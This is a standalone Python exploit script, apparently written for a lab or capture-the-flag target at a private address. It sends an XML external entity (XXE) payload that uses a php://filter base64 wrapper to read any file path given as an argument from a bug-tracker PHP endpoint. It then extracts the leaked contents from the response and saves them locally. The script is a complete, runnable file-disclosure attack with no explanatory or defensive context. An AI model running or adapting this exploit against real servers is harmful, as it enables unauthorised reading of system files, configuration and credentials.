#!/usr/bin/env python3
import sys
import requests
import base64
# php://filter/convert.base64-encode/resource=PAATHH
# file://PAATHH
def exploit(path):
    xml = '''<?xml  version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE bugreport [
        <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=PAATHH">
    ]>
    <bugreport>
        <title>test</title>
        <cwe>123</cwe>
        <cvss>&xxe;</cvss>
        <reward>12333</reward>
        </bugreport>
    '''
    xml = xml.replace('PAATHH', path)
    headers = {'X-Requested-With': 'XMLHttpRequest', }
    data = {'data': base64.b64encode(xml.encode('utf-8'))}
    #data = {'data': 'PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50ZXN0PC90aXRsZT4KCQk8Y3dlPjEyMzwvY3dlPgoJCTxjdnNzPjEyMzM8L2N2c3M+CgkJPHJld2FyZD4xMjMzMzwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg=='}
    r = requests.post('http://10.10.11.100/tracker_diRbPr00f314.php', data=data, headers=headers)

    source = r.text
    source = source[source.index('Score:'):]
    source = source[source.index('<td>')+4:]
    source = source[:source.index('</td>')]
    print (base64.b64decode(source))
    f = open(path.replace('/', '_'), 'wb')
    f.write(base64.b64decode(source))
    f.close()

if __name__ == '__main__':
    exploit(sys.argv[1])
